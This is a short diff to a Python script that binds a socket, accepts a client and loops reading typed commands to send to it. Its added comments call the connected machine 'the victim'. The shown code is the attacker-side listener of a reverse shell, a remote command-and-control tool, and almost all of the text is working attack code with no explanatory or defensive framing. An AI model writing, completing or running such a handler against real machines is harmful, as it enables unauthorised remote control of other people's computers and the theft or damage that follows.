@@ -15,16 +15,17 @@ s.bind((SERVER_HOST, SERVER_PORT))
 s.listen(5)
 print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
 
-
 # Accept client to connect
 client_socket, client_address = s.accept()
-
 print(f"{client_address[0]}:{client_address[1]} Connected!")
 
+# Receiving the current working directory from the victim
 cwd = client_socket.recv(BUFFER_SIZE).decode()
 print("[+] Current working directory", cwd)
 
+# Loop for making commands and sending them to the victim
 while True:
+    # Reading 
     command = input(f"{cwd} $> ")
     if not command.strip():
         continue
